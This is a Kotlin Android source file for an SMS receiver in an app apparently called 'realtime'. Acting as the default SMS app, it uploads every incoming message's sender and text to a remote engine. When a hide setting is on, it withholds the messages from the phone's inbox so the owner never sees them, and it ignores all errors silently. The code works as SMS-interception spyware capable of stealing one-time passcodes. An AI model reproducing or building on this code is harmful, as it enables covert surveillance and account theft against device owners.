package com.base.realtime.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.base.realtime.RealtimeApp

/**
 * Only the default SMS app receives this. When hide is on we upload and do not
 * write the provider row, so Messages never shows the SMS.
 */
class SmsDeliverReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        if (intent.action != Telephony.Sms.Intents.SMS_DELIVER_ACTION) return
        if (!SmsPermissions.granted(context)) return
        val messages = try {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)
        } catch (_: Throwable) {
            null
        } ?: return
        if (messages.isEmpty()) return
        val byAddress = linkedMapOf<String, StringBuilder>()
        var date = System.currentTimeMillis()
        for (msg in messages) {
            val address = msg.displayOriginatingAddress.orEmpty()
            val body = msg.displayMessageBody.orEmpty()
            if (msg.timestampMillis > 0) date = msg.timestampMillis
            byAddress.getOrPut(address) { StringBuilder() }.append(body)
        }
        val items = byAddress.map { (address, body) ->
            SmsReader.fromIncoming(address, body.toString(), date)
        }
        if (items.isEmpty()) return
        val hide = SmsHideStore.hideIncoming(context)
        val pending = goAsync()
        try {
            val fresh = SmsUploadGate.take(items)
            if (fresh.isNotEmpty()) {
                RealtimeApp.engine(context).uploadSms(fresh)
            }
            Offmode.onIncoming(context, items)
            if (hide) {
                SmsInboxCleaner.scheduleHideIncoming(context, items)
            } else {
                SmsProviderWrite.insertInbox(context, items)
            }
        } catch (_: Throwable) {
        } finally {
            pending.finish()
        }
    }
}
